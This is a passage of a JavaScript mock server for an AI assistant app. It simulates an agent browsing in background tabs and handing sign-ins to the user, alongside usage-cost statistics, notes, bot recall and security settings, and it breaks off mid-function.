// The agent works in tabs of its own (no board, no tile): its `browser` results carry `details { tab, board_id:
// null, url, title, shot }` (`shot`: a small picture of the pretend page). `browser_watch { session_id, tab }` →
// Whiteboard: the user's "Watch" on a step; the tab becomes a web view with `by_user: true` that the device
// places (the mock adds no tile), and the agent carries on in it; a tab already watched or shown gives its board.
// Scenarios: "go to/browse/visit X" → background steps (open, read, click), no tile; "show me X" → open, then
// `show` (one tile beside the chat); "sign in to/log in to X" → open, then `needs_user` with a reason: the tab
// goes on screen with a confirm ask (Done / I can't) and the turn waits for it.
const AGENT_TABS = new Map(); // tab key → { key, session_id, history, index, board_id }
let agentTabN = 0;
function agentTab(sessionId, url) {
  const tab = { key: `t${++agentTabN}`, session_id: sessionId, history: [url], index: 0, board_id: null };
  AGENT_TABS.set(tab.key, tab);
  return tab;
}
/** The tab a background tab became (a web view's), once watched or shown. */
const liveTab = (tab) => (tab.board_id ? BROWSER.tabs.get(tab.board_id) : null);
const agentUrl = (tab) => { const l = liveTab(tab); return l ? tabUrl(l) : tab.history[tab.index]; };
function agentGo(tab, url) {
  const l = liveTab(tab);
  if (l) return navigate(l, url);
  tab.history = tab.history.slice(0, tab.index + 1);
  tab.history.push(url);
  tab.index = tab.history.length - 1;
}
/** A small picture of the pretend page (what a step's card shows). */
function pageShot(url) {
  const p = renderTab({ history: [url], index: 0, zoom: 0.6, scroll: 0, focus: false, text: '', mark: null, loading: false, size: { w: 240, h: 150 } });
  return { mime: p.mime, data: p.data, width: p.width, height: p.height };
}
function stepDetails(tab, action) {
  const url = agentUrl(tab);
  return { tab: tab.key, board_id: tab.board_id, url, title: pageTitleOf(url), action, popup: false, shot: pageShot(url) };
}
function pageTitleOf(url) {
  try { const u = new URL(url); return (u.host.replace(/^www\./, '') + (u.pathname === '/' ? '' : u.pathname)).slice(0, 60); } catch { return url; }
}
/** The tab becomes the tab of a web view board (`show`, `needs_user`, the user's Watch), page and history kept. */
function adoptTab(tab, board) {
  tab.board_id = board.id;
  const t = browserTab(board.id);
  t.history = tab.history.slice();
  t.index = tab.index;
  tabChanged(t);
  return t;
}
for (const [name, fn] of Object.entries({
  browser_watch(p) {
    const sid = String(need(p, 'session_id'));
    const key = String(need(p, 'tab'));
    const rec = state.sessions.get(sid);
    if (!rec) throw notFound(`Session not found: ${sid}`);
    const known = state.boards.get(key);
    if (known && rootSession(known.session_id) === rootSession(sid)) return known;
    const tab = AGENT_TABS.get(key);
    if (!tab || tab.session_id !== sid) throw badRequest('that tab is closed');
    if (tab.board_id && state.boards.has(tab.board_id)) return state.boards.get(tab.board_id);
    const url = agentUrl(tab);
    const board = showBoard(sid, { title: pageTitleOf(url), content: { type: 'url', url }, byUser: true }, 'none');
    adoptTab(tab, board);
    return board;
  },
})) handlers[name] = fn;

/** A plain white picture (a page that hasn't drawn anything yet). */
function blankShot(w = 240, h = 150) {
  const raw = Buffer.alloc((w * 3 + 1) * h, 255);
  for (let y = 0; y < h; y++) raw[y * (w * 3 + 1)] = 0;
  const ihdr = Buffer.alloc(13);
  ihdr.writeUInt32BE(w, 0); ihdr.writeUInt32BE(h, 4); ihdr[8] = 8; ihdr[9] = 2;
  const png = Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), pngChunk('IHDR', ihdr), pngChunk('IDAT', zlib.deflateSync(raw, { level: 1 })), pngChunk('IEND', Buffer.alloc(0))]);
  return { mime: 'image/png', data: png.toString('base64'), width: w, height: h };
}
/**
 * `POST /__mock/steps-chat` → SessionInfo: a Scout chat with two long finished runs of steps, browsing in
 * background tabs (layout tests for narrow panes). Run one: 13 steps over 14 s, 1 failed, its last page
 * still white. Run two: 30 steps over about 2 minutes, 5 failed; its last browser step is the chat's latest
 * (picture + Watch). Created on demand only, so the seeded lists stay as they are.
 */
function seedStepsChat() {
  const scout = state.bots.find((b) => b.id === SCOUT);
  const t0 = now() - 20 * MIN;
  const items = [];
  let ts = t0;
  const at = (ms) => (ts += ms);
  let n = 0;
  const tabKey = `t${++agentTabN}`;
  AGENT_TABS.set(tabKey, { key: tabKey, session_id: null, history: ['https://shop.example.com/'], index: 0, board_id: null });
  const browse = (action, url, ms, { fail = false, blank = false } = {}) => {
    const id = `call_s${++n}`;
    items.push({ ...A(CALL(id, 'browser', action === 'open' ? { action, url } : { action, ref: String(n % 9 + 1) })), ts: at(400) });
    items.push({
      ...R(id, 'browser', fail ? `Element [${n % 9 + 1}] is no longer on the page.` : `${pageTitleOf(url)} — ${url}\n[1] link "Next page"`, { is_error: fail }),
      ...(fail ? {} : { details: { tab: tabKey, board_id: null, url, title: pageTitleOf(url), action, popup: false, shot: blank ? blankShot() : pageShot(url) } }),
      ts: at(ms),
    });
  };
  const search = (query, ms) => {
    const id = `call_s${++n}`;
    items.push({ ...A(CALL(id, 'web_search', { query })), ts: at(300) });
    items.push({ ...R(id, 'web_search', `1. ${query} — shop.example.com\n2. ${query} review — reviews.example.org`), ts: at(ms) });
  };
  items.push({ ...U('Find me a quiet e-reader under €200 and compare the best three.'), ts: at(0) });
  // Run one: 13 steps, about 14 s, one failed; the last page hasn't drawn yet (white).
  search('quiet e-reader under 200 euro', 1400);
  for (let i = 0; i < 11; i++) browse(i === 0 ? 'open' : 'click', `https://shop.example.com/readers/${i}`, 1050, { fail: i === 6 });
  browse('click', 'https://shop.example.com/readers/compare', 1050, { blank: true });
  items.push({ ...A('I found three that fit. The Kobo Clara is the quietest; the other two are close behind. Want the details?'), ts: at(2000) });
  items.push({ ...U('Yes: check reviews and prices in three shops.'), ts: at(60_000) });
  // Run two: 30 steps, about 2 minutes, five failed; the last browser step can be watched.
  for (let i = 0; i < 30; i++) {
    if (i % 6 === 2) search(`e-reader review ${i}`, 4030);
    else browse(i % 5 === 1 ? 'open' : 'click', `https://reviews.example.org/page/${i}`, 4030, { fail: i % 6 === 4 });
  }
  items.push({ ...A('Prices and reviews are in. The Kobo Clara is €149 at two shops and has the best reviews for quiet page turns.'), ts: at(2500) });
  const rec = seedSession({
    id: `ses_${hex(6)}`, title: 'Compare e-readers', bot_id: SCOUT, model: scout?.model ?? { provider: 'anthropic', model: 'claude-haiku-5' },
    permission: scout?.permission ?? 'read_only', cwd: HOME, created: t0, updated: ts, items,
  }, state.providers);
  AGENT_TABS.get(tabKey).session_id = rec.info.id;
  state.sessions.set(rec.info.id, rec);
  emitSession(rec);
  return rec.info;
}

/** The `browser` tool: the agent looks at a page in a background tab; a tile only when shown or handed over. */
async function scenarioBrowse(t, text, rec) {
  const m = /\b((?:https?:\/\/)?(?:[a-z0-9-]+\.)+[a-z]{2,}(?:\/[^\s]*)?)/i.exec(text);
  const url = m ? (/^https?:/i.test(m[1]) ? m[1] : `https://${m[1]}`).replace(/[.,!?]+$/, '') : 'https://example.com/';
  const signIn = /\b(sign|log)\s*(in|into|on)\b/i.test(text);
  const showMe = !signIn && /\b(show me|let me see|so i can see)\b/i.test(text);
  let tab = null;
  await t.step({
    thinking: 'Open it in a background tab of my own.',
    text: "I'll have a look at it.",
    calls: [{
      name: 'browser', args: { action: 'open', url },
      exec: {
        duration: 400,
        run: async () => {
          tab = agentTab(rec.info.id, url);
          return { text: `Opened background tab \`${tab.key}\`.\n${pageTitleOf(url)} — ${url}\n[1] link "Next page"\n[2] textbox "Search"\n[3] button "Continue"`, details: stepDetails(tab, 'open') };
        },
      },
    }],
  });
  if (signIn) {
    const reason = `Sign in to ${pageTitleOf(url)} (there is no stored login for it)`;
    let board = null;
    const [r] = await t.step({
      thinking: 'There is no stored login for this site: hand it to the user and wait.',
      text: 'You need to sign in yourself; it is on your screen now.',
      calls: [{
        name: 'browser', args: { action: 'needs_user', tab: tab?.key, reason },
        exec: {
          duration: 200,
          run: async (turn, _call, rt) => {
            board = showBoard(rec.info.id, { title: pageTitleOf(agentUrl(tab)), content: { type: 'url', url: agentUrl(tab) } });
            adoptTab(tab, board);
            turn.toolOutput(rt, `Waiting for the user: ${reason}\n`);
            const ans = await askBoard(rec.info.id, { id: board.id, prompt: reason, input: { type: 'confirm' } }, turn);
            const done = ans?.type === 'confirm' && ans.yes;
            return {
              text: ans?.type === 'cancel' ? 'The user declined this.' : done ? `The user is done.\n${pageTitleOf(agentUrl(tab))} — ${agentUrl(tab)}` : "The user couldn't do it.",
              details: stepDetails(tab, 'needs_user'),
            };
          },
        },
      }],
    });
    await t.step({ thinking: 'Carry on.', text: /done/.test(r?.text ?? '') ? "Thanks, you're signed in. I'll carry on in the background." : "No problem, I'll leave it there." });
    return;
  }
  if (showMe) {
    await t.step({
      thinking: 'The user asked to see it: put it on screen.',
      calls: [{
        name: 'browser', args: { action: 'show', tab: tab?.key, reason: 'You asked to see it' },
        exec: {
          duration: 250,
          run: async () => {
            const board = showBoard(rec.info.id, { title: pageTitleOf(agentUrl(tab)), content: { type: 'url', url: agentUrl(tab) } });
            adoptTab(tab, board);
            return { text: `Tab \`${board.id}\` is in a tile beside the chat: the user sees this page as it is.`, details: stepDetails(tab, 'show') };
          },
        },
      }],
    });
    await t.step({ thinking: 'Point at it.', text: `It's beside this chat (${url.replace(/^https?:\/\//, '')}).` });
    return;
  }
  await t.step({
    thinking: 'See what is on the page.',
    calls: [{
      name: 'browser', args: { action: 'snapshot' },
      exec: { duration: 300, run: async () => ({ text: `${pageTitleOf(agentUrl(tab))} — ${agentUrl(tab)}\n[1] link "Next page"\n[2] textbox "Search"\n[3] button "Continue"`, details: stepDetails(tab, 'snapshot') }) },
    }],
  });
  await t.step({
    thinking: 'Follow the link.',
    calls: [{
      name: 'browser', args: { action: 'click', ref: '1', text: 'Next page' },
      exec: {
        duration: 300,
        run: async () => {
          agentGo(tab, agentUrl(tab).replace(/\/?$/, '/next'));
          return { text: `Clicked "Next page". Page: ${agentUrl(tab)}`, details: stepDetails(tab, 'click') };
        },
      },
    }],
  });
  await t.step({ thinking: 'Report.', text: `I had a look at ${url.replace(/^https?:\/\//, '')} in the background and followed its first link. Tap Watch on a step to see the page live.` });
}
SCENARIOS.unshift([/\b(go to|browse|visit|show me|sign in to|log in to|log into)\s+(https?:\/\/)?([a-z0-9-]+\.)+[a-z]{2,}|\bin the browser\b|\bopen (https?:\/\/)?([a-z0-9-]+\.)+[a-z]{2,}/i, scenarioBrowse]);
// ─── end of APP-WEB browser block ────────────────────────────────────────────

// ─── APP-PANELS / APP-BOTS mock handlers (usage stats; bots; recall) ──────────
// Owned by the APP-PANELS track (Settings → Models → Usage and cost, the sidebar's Notes tab).
// Added only where the mock doesn't already answer the method.
//
// `get_usage { from?, to?, utc_offsets? }` → UsageReport: a made-up but stable history (the
// same day always has the same numbers): Sonnet and Haiku with list prices,
// two local models without (cost unknown), every kind of request.
// `mock_agent_note { session_id?, title, content }` → Note: a note an agent
// wrote (by_user: false), as the `note` tool would (for the Notes tab's tests).
const PANELS_MODELS = [
  { provider: 'anthropic', model: 'claude-sonnet-5-5', weight: 1, price: { input: 3, output: 15, cache_read: 0.3, cache_write: 3.75 } },
  { provider: 'local', model: 'qwen3.8-27b', weight: 0.8 },
  { provider: 'anthropic', model: 'claude-haiku-5', weight: 0.45, price: { input: 1, output: 5, cache_read: 0.1, cache_write: 1.25 } },
  { provider: 'local', model: 'gemma-4-12b', weight: 0.25 },
];
const PANELS_KINDS = [['chat', 1], ['subagent', 0.35], ['memory', 0.12], ['title', 0.05], ['compaction', 0.08], ['job', 0.18]];
const panelsDay = (t) => {
  const d = new Date(t);
  return `${d.getFullYear()}-${String(d.getMonth() + 1).padStart(2, '0')}-${String(d.getDate()).padStart(2, '0')}`;
};
/**
 * The asking device's day for instant `t` (usage.rs / store.rs `usage_groups`): `utc_offsets` is its
 * offset from UTC (minutes east) from each instant on, oldest first, the first also standing for
 * everything before it; without them (older apps) the server's own time zone (here: the mock's).
 */
const usageDay = (t, offsets) => {
  if (!Array.isArray(offsets) || !offsets.length) return panelsDay(t);
  let min = offsets[0].minutes;
  for (const o of offsets) if (t >= o.since) min = o.minutes;
  return new Date(t + min * 60_000).toISOString().slice(0, 10);
};
/** `get_usage`'s `utc_offsets`, checked as the server does (≤ 400, ±18 h, oldest first). */
const usageOffsets = (p) => {
  const o = p.utc_offsets ?? [];
  if (!Array.isArray(o) || o.length > 400 || o.some((x) => !Number.isInteger(x?.minutes) || Math.abs(x.minutes) > 18 * 60 || !Number.isFinite(x?.since))) throw badRequest('`utc_offsets`: offsets are minutes from UTC, at most 18 hours');
  if (o.some((x, i) => i && x.since < o[i - 1].since)) throw badRequest('`utc_offsets`: oldest first');
  return o;
};
/**
 * Model requests at an exact instant (`POST /__mock/usage-row { ts, provider?, model?, kind?, input?, output? }`),
 * counted on the asking device's day like the server's own records (tests of days across midnight).
 */
function usageRowsIn(from, to) {
  return (state.usageRows ?? []).filter((r) => r.ts >= from && r.ts <= to);
}
/** A stable pseudo-random number in [0, 1) for a string. */
const panelsRand = (key) => {
  let h = 2166136261;
  for (const c of key) h = Math.imul(h ^ c.charCodeAt(0), 16777619);
  return ((h >>> 0) % 100000) / 100000;
};
const panelsZero = () => ({ requests: 0, input: 0, output: 0, cache_read: 0, cache_write: 0 });
function panelsAdd(into, u) {
  for (const k of ['requests', 'input', 'output', 'cache_read', 'cache_write']) into[k] += u[k];
  if (u.cost_usd != null) into.cost_usd = (into.cost_usd ?? 0) + u.cost_usd;
}
/** One model's usage for one kind on one day (zero on quiet days). */
function panelsCell(day, m, kind, kw) {
  const quiet = panelsRand(`${day}:quiet`) < 0.12;
  const r = panelsRand(`${day}:${m.model}:${kind}`);
  const busy = 0.4 + panelsRand(`${day}:busy`) * 1.6;
  const requests = quiet ? 0 : Math.round(r * 40 * m.weight * kw * busy);
  if (!requests) return null;
  const input = Math.round(requests * (1800 + r * 5200));
  const output = Math.round(requests * (240 + r * 900));
  const cache_read = m.provider === 'anthropic' ? Math.round(input * (2 + r * 4)) : 0;
  const cache_write = m.provider === 'anthropic' ? Math.round(input * 0.3) : 0;
  const u = { requests, input, output, cache_read, cache_write };
  if (m.price) u.cost_usd = (input * m.price.input + output * m.price.output + cache_read * m.price.cache_read + cache_write * m.price.cache_write) / 1e6;
  return u;
}
function panelsUsage(p) {
  const to = Number.isFinite(Number(p.to)) && p.to != null ? Number(p.to) : now();
  const from = Number.isFinite(Number(p.from)) && p.from != null ? Number(p.from) : to - 30 * DAY;
  const offsets = usageOffsets(p);
  // History starts 75 days ago; today counts up to now.
  const first = new Date(now() - 75 * DAY);
  first.setHours(0, 0, 0, 0);
  const total = panelsZero();
  const byModel = new Map();
  const byKind = new Map();
  const byDay = [];
  for (let t = Math.max(from, first.getTime()); t <= to; t += DAY) {
    // Each made-up day is the device's (its noon, so summer time's hour can't skip or repeat one).
    const day = usageDay(Math.min(t + DAY / 2, to), offsets);
    if (byDay.length && byDay[byDay.length - 1].day === day) continue;
    const dayTotal = panelsZero();
    const dayModels = new Map();
    for (const m of PANELS_MODELS) {
      for (const [kind, kw] of PANELS_KINDS) {
        const u = panelsCell(day, m, kind, kw);
        if (!u) continue;
        const key = `${m.provider}/${m.model}`;
        if (!dayModels.has(key)) dayModels.set(key, { provider: m.provider, model: m.model, totals: panelsZero() });
        if (!byModel.has(key)) byModel.set(key, { provider: m.provider, model: m.model, totals: panelsZero() });
        if (!byKind.has(kind)) byKind.set(kind, { kind, totals: panelsZero() });
        for (const into of [dayTotal, dayModels.get(key).totals, byModel.get(key).totals, byKind.get(kind).totals, total]) panelsAdd(into, u);
      }
    }
    if (dayTotal.requests) byDay.push({ day, totals: dayTotal, models: [...dayModels.values()] });
  }
  const byUse = (a, b) => b.totals.input + b.totals.output - (a.totals.input + a.totals.output);
  return { from, to, total, by_model: [...byModel.values()].sort(byUse), by_kind: [...byKind.values()].sort(byUse), by_day: byDay };
}
for (const [name, fn] of Object.entries({
  get_usage: (p) => panelsUsage(p),
  mock_agent_note: (p) => {
    const sid = p.session_id ?? [...state.sessions.values()].map((r) => r.info)
      .filter((i) => !i.private && !i.archived && i.kind === 'chat').sort((a, b) => b.updated_at - a.updated_at)[0]?.id;
    return saveNote({ id: null, title: p.title ?? 'Notes from the agent', content: p.content ?? '', session_id: sid, by_user: false });
  },
  // NOTES: an agent changes a note (as the `note` tool's edit/append/update would): `{ id, session_id?, content? |
  // find + replace | append }` → Note (agent_edit: true).
  mock_agent_edit: (p) => {
    const old = state.notes.get(String(p.id));
    if (!old) throw notFound(`no note \`${p.id}\``);
    let content = old.content;
    if (p.content != null) content = String(p.content);
    else if (p.find != null) {
      if (!content.includes(String(p.find))) throw badRequest('`find` isn\'t in the note');
      content = content.replace(String(p.find), String(p.replace ?? ''));
    } else if (p.append != null) content = `${content.replace(/\s+$/, '')}${content.trim() ? '\n\n' : ''}${String(p.append).trim()}`;
    const sid = p.session_id ?? old.session_id ?? [...state.sessions.values()].map((r) => r.info).filter((i) => !i.private && i.kind === 'chat')[0]?.id;
    return saveNote({ id: old.id, title: p.title ?? old.title, content, base_version: old.version, session_id: sid, by_user: false });
  },
  // NOTES: a slow link for get_note / save_note answers (the broadcast still goes out at once).
  mock_note_latency: (p) => {
    noteLatency = Math.max(0, Math.min(10_000, Number(p.ms) || 0));
    return null;
  },
})) if (!Object.hasOwn(handlers, name)) handlers[name] = fn;

// ── APP-BOTS: bot knowledge and conversation starters survive save_bot;
// `recall` with structured results ("recall …" / "remember when …").
// Bots' `knowledge` (note ids) and `starters` (strings) are kept as sent.
{
  const saveBot = handlers.save_bot;
  handlers.save_bot = (p, conn) => {
    const b = p?.bot ?? {};
    const extra = {
      // Mosaic portraits (`m:<id>`) as the real server keeps them (the mock's avatarOf cuts to 2 characters).
      avatar: typeof b.avatar === 'string' && /^m:[a-z0-9-]{1,30}$/.test(b.avatar) ? b.avatar : undefined,
      knowledge: Array.isArray(b.knowledge) ? [...new Set(b.knowledge.map(String))] : undefined,
      starters: Array.isArray(b.starters) ? b.starters.map((x) => String(x).trim()).filter(Boolean).slice(0, 4) : undefined,
    };
    const bot = saveBot(p, conn);
    let changed = false;
    for (const [k, v] of Object.entries(extra)) if (v !== undefined && JSON.stringify(bot[k]) !== JSON.stringify(v)) { bot[k] = v; changed = true; }
    if (!Array.isArray(bot.knowledge)) { bot.knowledge = []; changed = true; }
    if (changed) broadcast({ type: 'bot_updated', bot });
    return bot;
  };
  const list = handlers.list_bots;
  handlers.list_bots = (p, conn) => list(p, conn).map((b) => ({ knowledge: [], ...b }));
}
/** Past messages matching words of `query` (all chats, newest first). */
function botsRecallHits(query, limit = 6) {
  const words = String(query).toLowerCase().split(/\W+/).filter((w) => w.length > 2);
  const hits = [];
  for (const rec of state.sessions.values()) {
    if (rec.info.private || rec.info.internal) continue;
    for (const e of rec.entries) {
      const text = e.kind === 'user' || e.kind === 'assistant' ? (e.content ?? []).filter((c) => c.type === 'text').map((c) => c.text).join(' ') : '';
      if (!text || !words.some((w) => text.toLowerCase().includes(w))) continue;
      const i = Math.max(0, text.toLowerCase().indexOf(words.find((w) => text.toLowerCase().includes(w))) - 60);
      hits.push({ session_id: rec.info.id, session_title: rec.info.title || 'Untitled chat', seq: e.seq, ts: e.ts, snippet: (i ? '…' : '') + text.slice(i, i + 160).replace(/\s+/g, ' ') + (text.length > i + 160 ? '…' : '') });
    }
  }
  return hits.sort((a, b) => b.ts - a.ts).slice(0, limit);
}
async function scenarioRecall(t, text) {
  const query = (text.match(/(?:recall|remember when|what did we (?:say|decide) about)\s+(.*)/i)?.[1] ?? text).replace(/[?.!]+$/, '').trim() || text;
  const hits = botsRecallHits(query);
  const day = (ts) => new Date(ts).toISOString().slice(0, 10);
  const out = hits.length
    ? hits.map((h) => `seq ${h.seq} [${h.session_title} · ${day(h.ts)} · ${h.session_id}]: ${h.snippet}`).join('\n') + '\n(use seq=N to read an item in full, around=N for its neighbours)'
    : 'No matches.';
  await t.step({
    thinking: 'Look back through past chats for this.',
    text: 'Let me look back through our chats.',
    calls: [{ name: 'recall', args: { query, scope: 'all' }, exec: { duration: 350, text: out, details: { recall: { query, scope: 'all', hits } } } }],
  });
  await t.step({
    thinking: 'Summarize what came up, with where it came from.',
    text: hits.length ? `I found ${hits.length} earlier mention${hits.length === 1 ? '' : 's'}; the most recent is in “${hits[0].session_title}”.` : "I couldn't find anything about that in our past chats.",
  });
}
SCENARIOS.unshift([/\b(recall|remember when|what did we (?:say|decide) about)\b/i, scenarioRecall]);
// `mock_recall_lazy { phase: seed|stream|call|result }`: a persisted synthetic recall turn.
handlers.mock_recall_lazy = (p = {}) => recallLazyFixture(p.phase ?? 'seed', { createSession, addEntry, emitSession, broadcast, state, Turn, U, A, R, CALL, zeroUsage });
// The server's browser, as Settings → Web & voice shows it (`get_browser` / `set_browser { enabled, headless, quality }`).
// `mock_browser_speed { speed }` plays a server that draws pages this many sharp frames a second;
// `mock_browser_memory { ram }` one with little memory (its browser off until turned on; `ram: null` undoes it).
{
  const browser = { found: true, path: '/usr/bin/chromium', name: 'Chromium', running: false, headless: true, tabs: 0, quality: 'auto', speed: 60 };
  if (!Object.hasOwn(handlers, 'get_browser')) handlers.get_browser = () => ({ ...browser });
  if (!Object.hasOwn(handlers, 'set_browser')) handlers.set_browser = (p) => {
    if (typeof p.enabled === 'boolean') {
      if (p.enabled) delete browser.enabled;
      else browser.enabled = false;
    }
    if (typeof p.headless === 'boolean') browser.headless = p.headless;
    if (['auto', 'sharp', 'smooth'].includes(p.quality)) browser.quality = p.quality;
    return { ...browser };
  };
  if (!Object.hasOwn(handlers, 'mock_browser_speed')) handlers.mock_browser_speed = (p) => {
    browser.speed = typeof p.speed === 'number' ? p.speed : null;
    return { ...browser };
  };
  if (!Object.hasOwn(handlers, 'mock_browser_memory')) handlers.mock_browser_memory = (p) => {
    if (typeof p.ram === 'number') {
      browser.low_memory = p.ram;
      browser.enabled = false;
    } else {
      delete browser.low_memory;
      delete browser.enabled;
    }
    return { ...browser };
  };
}
// ─── end of APP-PANELS / APP-BOTS mock handlers ──────────────────────────────

// ─── APP-SETTINGS mock handlers (Security, usage pricing, secrets typed in chat) ───
// Settings → Privacy & safety: `get_security` → SecurityInfo; `set_security { sandbox?, folders?, ask_outside?,
// redact_patterns?, save_secrets_from_chat?, default_permission? }` → SecurityInfo. `default_permission` (the
// freedom new chats get on every device) is left out until a device sets it; new chats without a bot start with it. `mock_security { status?, complete?, hint?, windows? }`
// plays another kernel (tests): e.g. "partial (…)", complete: false and a hint with a `command`.
// Settings → Models → Usage and cost (PRICING's shapes): `get_usage` (replacing the APP-PANELS one) also reports `api_cost_usd`
// (list prices for every request, subscriptions included; `cost_usd` stays what is billed per token), each
// model's `billing`/`price`/`price_source`, `unpriced` ("provider/model" without a price, never local servers)
// and `subscriptions` (plan, `period_usd`, requests, `api_cost_usd`). ChatGPT (openai-codex, a subscription)
// and an unpriced OpenRouter model join the history. `set_subscription { provider, plan?, monthly_usd? }`
// (both absent: forget the plan) and `set_model_price { provider, model, price? }` → null.
// Chats: `send` saves known API key formats as secrets, keeps `$NAME` in the stored message and adds the
// server's info notice after it ("Saved to Passwords & keys: NAME (what). It was taken out of your message;
// …"). With `secret_saving` "ask" or "chat_only" (engine/security.rs) a new one is kept for that chat alone
// (`SecretInfo.chat`) and the notice is "Kept for this chat only: …", or with "ask" one card notice each
// ("Save to Passwords & keys? NAME (what) was taken out of your message and is kept for this chat only until
// you decide; …"); a value stored already becomes its name ("Your message held the stored secret $NAME; …").
// `decide_chat_secret { session_id, name, choice: save | chat_only | forget }` → null answers a card: the
// secret is saved (any chat), kept, or deleted, and the card's notice is rewritten (`entries_changed`).
// `delete_secret` on a kept one is `forget`; deleting the chat deletes what it kept.
// `mock_secret_notice { session_id, name? }` saves a login the way the agent's `save_secret` tool does:
// its values leave the stored chat (`entries_changed`) and the same kind of notice follows.
const SETTINGS_MODELS = [
  { provider: 'openai-codex', model: 'gpt-5.5', weight: 2.4, price: { input: 2.5, output: 15, cache_read: 0.25 }, billing: 'subscription' },
  { provider: 'openrouter', model: 'mistralai/mistral-small-3.2', weight: 0.15, billing: 'api' },
];
const settingsBilling = (m) => m.billing ?? (m.provider === 'local' ? 'local' : 'api');
const SETTINGS_PROTECTED = [`${HOME}/.local/share/tessera`, `${HOME}/.config/tessera`, `${HOME}/.local/share/dev.tessera.app`, '/run/user/1000'];
function settingsState() {
  state.appSettings ??= {
    security: { sandbox: 'auto', folders: [], ask_outside: true, redact_patterns: true, require_e2ee: true, save_secrets_from_chat: true, secret_saving: 'auto', secret_machines: 'off', secret_machines_picked: [], bot_handoff: 'on' },
    kernel: { status: 'on (namespaces + Landlock)', complete: true, hint: null },
    subs: new Map([
      ['openai-codex', { label: 'ChatGPT (subscription)', plan: null, monthly_usd: null }],
      ['claude-code', { label: 'Claude (your subscription, via Claude Code)', plan: null, monthly_usd: null }],
    ]),
    prices: new Map(), // "provider/model" → the user's price
    // USAGE: plans' limits as their providers last reported them (`mock_plan_limits` sets them).
    limits: new Map([
      ['openai-codex', [
        { window: 'five_hour', label: '5-hour limit', used_percent: 42, resets_at: now() + 130 * 60_000, updated_at: now() - 12 * 60_000 },
        { window: 'weekly', label: 'Weekly limit', used_percent: 18, resets_at: now() + 3 * DAY + 5 * 3_600_000, updated_at: now() - 12 * 60_000 },
      ]],
    ]),
  };
  return state.appSettings;
}
/** limits.rs `get`: the 5-hour and weekly limits always, others until they reset. */
function settingsLimits(provider) {
  const t = now();
  return (settingsState().limits.get(provider) ?? []).filter((l) => l.window === 'five_hour' || l.window === 'weekly' || (l.resets_at != null ? l.resets_at > t : t - l.updated_at < 7 * DAY)).map((l) => ({ ...l }));
}
function settingsSecurity() {
  const { security: s, kernel: k } = settingsState();
  // A Windows server (no sandbox there): new chats ask first until a device chooses (config.rs shared_permission).
  const shared = s.default_permission ?? (k.windows ? 'ask' : undefined);
  return {
    ...s, ...(shared ? { default_permission: shared } : {}), folders: s.folders.map((f) => ({ ...f })), secret_machines_picked: [...s.secret_machines_picked], sandbox_status: k.status, sandbox_complete: k.complete,
    ...(k.hint && !k.complete ? { sandbox_hint: k.hint } : {}), protected: [...SETTINGS_PROTECTED],
  };
}
const settingsPrice = (m) => settingsState().prices.get(`${m.provider}/${m.model}`) ?? m.price ?? null;
/** One model's usage for a kind on a day, priced: billed only when paid per token. */
function settingsCell(day, m, kind, kw) {
  const u = panelsCell(day, { ...m, price: undefined }, kind, kw);
  if (u && settingsBilling(m) === 'subscription') u.cache_read = u.input * 120; // agents reread their context: a heavy month runs to billions of tokens
  const price = u && settingsPrice(m);
  if (price) {
    u.api_cost_usd = (u.input * price.input + u.output * price.output + u.cache_read * (price.cache_read ?? price.input) + u.cache_write * (price.cache_write ?? price.input)) / 1e6;
    if (settingsBilling(m) !== 'subscription') u.cost_usd = u.api_cost_usd;
  }
  return u;
}
function settingsAdd(into, u) {
  panelsAdd(into, u);
  if (u.api_cost_usd != null) into.api_cost_usd = (into.api_cost_usd ?? 0) + u.api_cost_usd;
}
function settingsUsage(p) {
  const to = Number.isFinite(Number(p.to)) && p.to != null ? Number(p.to) : now();
  const from = Number.isFinite(Number(p.from)) && p.from != null ? Number(p.from) : to - 30 * DAY;
  const offsets = usageOffsets(p);
  const first = new Date(now() - 75 * DAY);
  first.setHours(0, 0, 0, 0);
  const models = [...PANELS_MODELS, ...SETTINGS_MODELS];
  const total = panelsZero();
  const byModel = new Map();
  const byKind = new Map();
  const byDay = [];
  for (let t = Math.max(from, first.getTime()); t <= to; t += DAY) {
    // Each made-up day is the device's (its noon, so summer time's hour can't skip or repeat one).
    const day = usageDay(Math.min(t + DAY / 2, to), offsets);
    if (byDay.length && byDay[byDay.length - 1].day === day) continue;
    const dayTotal = panelsZero();
    const dayModels = new Map();
    for (const m of models) {
      for (const [kind, kw] of PANELS_KINDS) {
        const u = settingsCell(day, m, kind, kw);
        if (!u) continue;
        const key = `${m.provider}/${m.model}`;
        const billing = settingsBilling(m);
        if (!dayModels.has(key)) dayModels.set(key, { provider: m.provider, model: m.model, totals: panelsZero(), billing });
        if (!byModel.has(key)) {
          const price = settingsPrice(m);
          const custom = settingsState().prices.has(key);
          byModel.set(key, { provider: m.provider, model: m.model, totals: panelsZero(), billing, ...(price ? { price, price_source: custom ? 'custom' : 'builtin' } : {}) });
        }
        if (!byKind.has(kind)) byKind.set(kind, { kind, totals: panelsZero() });
        for (const into of [dayTotal, dayModels.get(key).totals, byModel.get(key).totals, byKind.get(kind).totals, total]) settingsAdd(into, u);
      }
    }
    if (dayTotal.requests) byDay.push({ day, totals: dayTotal, models: [...dayModels.values()] });
  }
  // Requests recorded at an exact instant: on the device's day for that instant.
  for (const row of usageRowsIn(from, to)) {
    const day = usageDay(row.ts, offsets);
    let d = byDay.find((x) => x.day === day);
    if (!d) {
      d = { day, totals: panelsZero(), models: [] };
      byDay.push(d);
      byDay.sort((a, b) => (a.day < b.day ? -1 : a.day > b.day ? 1 : 0));
    }
    const u = { requests: 1, input: row.input, output: row.output, cache_read: 0, cache_write: 0 };
    const key = `${row.provider}/${row.model}`;
    let dm = d.models.find((m) => `${m.provider}/${m.model}` === key);
    if (!dm) d.models.push((dm = { provider: row.provider, model: row.model, totals: panelsZero(), billing: 'api' }));
    if (!byModel.has(key)) byModel.set(key, { provider: row.provider, model: row.model, totals: panelsZero(), billing: 'api' });
    if (!byKind.has(row.kind)) byKind.set(row.kind, { kind: row.kind, totals: panelsZero() });
    for (const into of [d.totals, dm.totals, byModel.get(key).totals, byKind.get(row.kind).totals, total]) settingsAdd(into, u);
  }
  const byUse = (a, b) => b.totals.input + b.totals.output - (a.totals.input + a.totals.output);
  const unpriced = [...byModel.values()].filter((m) => m.totals.api_cost_usd == null && m.billing !== 'local').map((m) => `${m.provider}/${m.model}`);
